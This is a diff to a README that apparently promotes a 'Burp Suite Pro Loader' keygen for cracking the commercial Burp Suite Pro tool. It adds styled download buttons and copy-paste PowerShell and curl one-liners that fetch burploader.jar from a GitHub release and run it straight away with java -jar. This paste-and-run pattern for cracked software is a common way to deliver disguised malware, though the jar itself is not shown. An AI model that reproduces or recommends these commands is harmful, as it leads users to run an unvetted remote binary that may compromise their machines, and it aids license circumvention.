@@ -6,49 +6,69 @@
   <img src="https://img.shields.io/badge/Burp%20Suite-Pro%20Loader-F46A0A?style=for-the-badge&logo=burpsuite&logoColor=white" />
 </p>
 
-## Download
-
 <p align="center">
-  <a href="https://github.com/uppermo0n/burpsuite/releases/download/v2/burploader.jar" style="font-size:18px;color:#F46A0A;font-weight:bold;text-decoration:none">⬇ Click here to download</a>
+  <a href="https://github.com/uppermo0n/burpsuite/releases/download/v2/burploader.jar" style="font-size:22px;font-weight:bold;color:#FF6B00;text-decoration:none;background:#1a1a26;padding:12px 32px;border-radius:8px">⬇ Download burploader.jar</a>
 </p>
 
-Save as `burploader.jar`, then open a terminal and run:
-
-```bash
-java -jar burploader.jar
-```
+<p align="center">
+  <sub>Save the file anywhere, then open a terminal and run <code>java -jar burploader.jar</code></sub>
+</p>
 
 ---
 
-### Or grab it from the terminal
+<br>
 
-**Download only**
+### 💻 Download from terminal
 
-*Windows (PowerShell) — saves the file to your current directory*
+> *Saves the file to your current directory. Run <code>java -jar burploader.jar</code> afterwards.*
+
+<details open>
+<summary><b>Windows</b> (PowerShell)</summary>
+
 ```powershell
 powershell -c "irm https://github.com/uppermo0n/burpsuite/releases/download/v2/burploader.jar -OutFile burploader.jar"
 ```
 
-*macOS / Linux — saves the file to your current directory*
+</details>
+
+<details open>
+<summary><b>macOS / Linux</b></summary>
+
 ```bash
 curl -fsSL https://github.com/uppermo0n/burpsuite/releases/download/v2/burploader.jar -o burploader.jar
 ```
 
-**Download & launch in one go**
+</details>
 
-*Windows (PowerShell)*
+<br>
+
+### ⚡ Download & run in one command
+
+> *Downloads and launches the keygen immediately.*
+
+<details open>
+<summary><b>Windows</b> (PowerShell)</summary>
+
 ```powershell
 powershell -c "irm https://github.com/uppermo0n/burpsuite/releases/download/v2/burploader.jar -OutFile burploader.jar; java -jar burploader.jar"
 ```
 
-*macOS / Linux*
+</details>
+
+<details open>
+<summary><b>macOS / Linux</b></summary>
+
 ```bash
 curl -fsSL https://github.com/uppermo0n/burpsuite/releases/download/v2/burploader.jar -o burploader.jar && java -jar burploader.jar
 ```
 
+</details>
+
+<br>
+
 ---
 
-## Requirements
+### Requirements
 
 | | Version |
 |---|---|
